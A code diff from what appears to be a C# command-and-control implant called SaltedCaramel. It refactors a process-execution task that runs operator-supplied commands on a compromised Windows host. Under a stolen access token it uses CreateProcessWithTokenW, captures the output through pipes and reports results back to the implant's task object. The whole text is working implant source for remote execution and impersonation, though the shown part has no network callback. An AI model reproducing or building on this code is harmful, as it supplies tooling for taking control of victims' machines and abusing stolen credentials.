@@ -9,13 +9,13 @@ using System.Runtime.InteropServices;
 using System.Security.AccessControl;
 using System.Threading;
 
-namespace SaltedCaramel
+namespace SaltedCaramel.Tasks
 {
     internal class Proc
     {
         // If we have a stolen token, we need to start a process with CreateProcessWithTokenW
         // Otherwise, we can use Process.Start
-        internal static void Execute(SCTask task, SCImplant implant)
+        internal static void Execute(SCTaskObject task, SCImplant implant)
         {
             if (implant.hasAlternateToken() == true)
                 StartProcessWithToken(task, implant, Token.stolenHandle);
@@ -30,7 +30,7 @@ namespace SaltedCaramel
         /// <param name="task"></param>
         /// <param name="implant"></param>
         /// <param name="TokenHandle"></param>
-        internal static void StartProcessWithToken(SCTask task, SCImplant implant, IntPtr TokenHandle)
+        internal static void StartProcessWithToken(SCTaskObject task, SCImplant implant, IntPtr TokenHandle)
         {
             string[] split;
             string argString;
@@ -112,7 +112,7 @@ namespace SaltedCaramel
                 bool createProcess = Win32.CreateProcessWithTokenW(
                     TokenHandle,            // hToken
                     IntPtr.Zero,            // dwLogonFlags
-                    file,                   // lpApplicationName
+                    null,                   // lpApplicationName
                     file + " " + argString, // lpCommandLineName
                     IntPtr.Zero,            // dwCreationFlags
                     IntPtr.Zero,            // lpEnvironment
@@ -197,15 +197,14 @@ namespace SaltedCaramel
                         }
                         if (output.Count > 0)
                         {
-                            response = new SCTaskResp(task.id, JsonConvert.SerializeObject(output));
-                            implant.PostResponse(response);
+                            task.status = "complete";
+                            task.message = JsonConvert.SerializeObject(output);
                             output.Clear();
                         }
                     }
 
                     pipeServer.Close();
                     pipeServer.Dispose();
-                    implant.SendComplete(task.id);
                 }
                 else
                 {
@@ -215,7 +214,8 @@ namespace SaltedCaramel
                     pipeServer.Close();
                     pipeClient.Dispose();
                     pipeServer.Dispose();
-                    implant.SendError(task.id, "Error starting process: " + errorMessage);
+                    task.status = "error";
+                    task.message = errorMessage;
                 }
             }
             catch (Exception e)
@@ -224,7 +224,8 @@ namespace SaltedCaramel
                 pipeServer.Close();
                 pipeClient.Dispose();
                 pipeServer.Dispose();
-                implant.SendError(task.id, "Error: " + e.Message);
+                task.status = "error";
+                task.message = e.Message;
             }
         }
 
@@ -234,7 +235,7 @@ namespace SaltedCaramel
         /// </summary>
         /// <param name="task"></param>
         /// <param name="implant"></param>
-        internal static void StartProcess (SCTask task, SCImplant implant)
+        internal static void StartProcess (SCTaskObject task, SCImplant implant)
         {
             string[] split = task.@params.Trim().Split(' ');
             string argString = string.Join(" ", split.Skip(1).ToArray());
@@ -269,14 +270,14 @@ namespace SaltedCaramel
                 }
 
                 proc.WaitForExit();
-                response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
-                implant.PostResponse(response);
-                implant.SendComplete(task.id);
+                task.status = "complete";
+                task.message = JsonConvert.SerializeObject(procOutput);
             }
             catch (Exception e)
             {
                 Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
-                implant.SendError(task.id, e.Message);
+                task.status = "error";
+                task.message = e.Message;
             }
         }
     }
